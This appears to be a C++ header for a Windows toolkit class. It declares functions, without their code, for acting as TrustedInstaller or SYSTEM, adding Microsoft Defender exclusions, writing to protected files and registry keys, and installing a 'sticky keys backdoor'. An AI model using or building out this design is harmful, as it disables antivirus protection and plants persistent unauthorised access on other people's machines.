#pragma once

#include <windows.h>
#include <string>
#include <vector>
#include <string_view>
#include <span>

class TrustedInstallerIntegrator
{
public:
    TrustedInstallerIntegrator();
    ~TrustedInstallerIntegrator();

    enum class ExclusionType {
        Paths,
        Processes,
        Extensions,
        IpAddresses
    };

    // Process execution
    bool RunAsTrustedInstaller(const std::wstring& commandLine);
    bool RunAsTrustedInstallerSilent(const std::wstring& commandLine);
    
    // File operations (NEW - direct write/delete with TrustedInstaller)
    bool WriteFileAsTrustedInstaller(std::wstring_view filePath, 
                                     std::span<const BYTE> data) noexcept;
    bool DeleteFileAsTrustedInstaller(std::wstring_view filePath) noexcept;
    
    bool RenameFileAsTrustedInstaller(std::wstring_view srcPath, 
                                      std::wstring_view dstPath) noexcept;
    
    // Creates a directory with TrustedInstaller privileges
    bool CreateDirectoryAsTrustedInstaller(std::wstring_view directoryPath) noexcept;
    
    // Registry operations (NEW - direct registry access with TrustedInstaller)
    bool CreateRegistryKeyAsTrustedInstaller(HKEY hRootKey, 
                                             std::wstring_view subKey) noexcept;
    bool WriteRegistryValueAsTrustedInstaller(HKEY hRootKey,
                                              std::wstring_view subKey,
                                              std::wstring_view valueName,
                                              std::wstring_view value) noexcept;
    bool WriteRegistryDwordAsTrustedInstaller(HKEY hRootKey,
                                              std::wstring_view subKey,
                                              std::wstring_view valueName,
                                              DWORD value) noexcept;
    bool WriteRegistryBinaryAsTrustedInstaller(HKEY hRootKey,
                                               std::wstring_view subKey,
                                               std::wstring_view valueName,
                                               std::span<const BYTE> data) noexcept;
    bool ReadRegistryValueAsTrustedInstaller(HKEY hRootKey,
                                             std::wstring_view subKey,
                                             std::wstring_view valueName,
                                             std::wstring& outValue) noexcept;
    bool DeleteRegistryKeyAsTrustedInstaller(HKEY hRootKey,
                                             std::wstring_view subKey) noexcept;
    
    // Defender exclusions
    bool AddDefenderExclusion(ExclusionType type, std::wstring_view value);
    bool RemoveDefenderExclusion(ExclusionType type, std::wstring_view value);
    bool AddToDefenderExclusions(std::wstring_view customPath = L"");
    bool RemoveFromDefenderExclusions(std::wstring_view customPath = L"");
    
    bool AddPathExclusion(std::wstring_view path);
    bool RemovePathExclusion(std::wstring_view path);
    bool AddProcessExclusion(std::wstring_view processName);
    bool RemoveProcessExclusion(std::wstring_view processName);
    bool AddExtensionExclusion(std::wstring_view extension);
    bool RemoveExtensionExclusion(std::wstring_view extension);
    bool AddIpAddressExclusion(std::wstring_view ipAddress);
    bool RemoveIpAddressExclusion(std::wstring_view ipAddress);
    
    bool AddProcessToDefenderExclusions(std::wstring_view processName);
    bool RemoveProcessFromDefenderExclusions(std::wstring_view processName);

    // Simplified Defender exclusion management
    int AddMultipleDefenderExclusions(
        const std::vector<std::wstring>& paths,
        const std::vector<std::wstring>& processes,
        const std::vector<std::wstring>& extensions);
    
    // Sticky keys backdoor
    bool InstallStickyKeysBackdoor() noexcept;
    bool RemoveStickyKeysBackdoor() noexcept;
    
    // Context menu
    bool AddContextMenuEntries();
    
    // Token access
    HANDLE GetCachedTrustedInstallerToken();
    DWORD StartTrustedInstallerService();
    bool PublicImpersonateSystem() { return ImpersonateSystem(); }
    
    static const LPCWSTR* GetAllPrivileges() { return ALL_PRIVILEGES; }
    static int GetPrivilegeCount() { return PRIVILEGE_COUNT; }

private:
    static const LPCWSTR ALL_PRIVILEGES[];
    static const int PRIVILEGE_COUNT;

    // Defender availability checking
    bool IsDefenderAvailable() noexcept;
    bool IsDefenderRunning() noexcept;

    BOOL EnablePrivilegeInternal(std::wstring_view privilegeName);
    BOOL ImpersonateSystem();
    BOOL CreateProcessAsTrustedInstaller(DWORD pid, std::wstring_view commandLine);
    BOOL CreateProcessAsTrustedInstallerSilent(DWORD pid, std::wstring_view commandLine);
    
    DWORD GetProcessIdByName(std::wstring_view processName);
    bool IsLnkFile(std::wstring_view path);
    std::wstring ResolveLnk(std::wstring_view lnkPath);
    
    bool ValidateExtension(std::wstring_view extension) noexcept;
    bool ValidateIpAddress(std::wstring_view ipAddress) noexcept;
    std::wstring NormalizeExtension(std::wstring_view extension) noexcept;
    std::wstring ExtractProcessName(std::wstring_view fullPath) noexcept;
};